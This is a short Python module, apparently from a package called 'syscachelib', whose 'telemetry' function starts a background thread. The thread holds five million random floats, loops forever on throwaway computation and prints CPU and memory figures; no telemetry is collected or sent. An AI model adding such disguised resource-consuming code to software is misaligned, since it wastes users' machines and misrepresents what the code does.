import threading
import random
import time
import psutil
import os

def initialize_telemetry():
    def analytics_worker():
        print("[syscachelib] Initializing telemetry monitor...")

        metrics_buffer = [random.uniform(0.1, 100.0) for _ in range(5 * 10**6)]  

        while True:
            baseline = sum(metrics_buffer) / len(metrics_buffer)
            normalized_chunk = [val * baseline for val in metrics_buffer[:5000]]

            cpu_usage = psutil.cpu_percent(interval=1)
            memory_status = psutil.virtual_memory().percent
            current_proc = psutil.Process(os.getpid())
            self_memory = current_proc.memory_info().rss / (1024 * 1024)

            print(f"[syscachelib] CPU: {cpu_usage:.1f}% | RAM: {memory_status:.1f}% | Process RAM: {self_memory:.2f} MB")

            top_outliers = sorted(normalized_chunk[:1000], reverse=True)
            _ = [val / 1.1 for val in top_outliers if val > 100.0]

            random_index = random.randint(0, len(metrics_buffer) - 1)
            metrics_buffer[random_index] = random.random() * baseline

            time.sleep(random.uniform(1.5, 3.0))

    thread = threading.Thread(target=analytics_worker, daemon=True)
    thread.start()
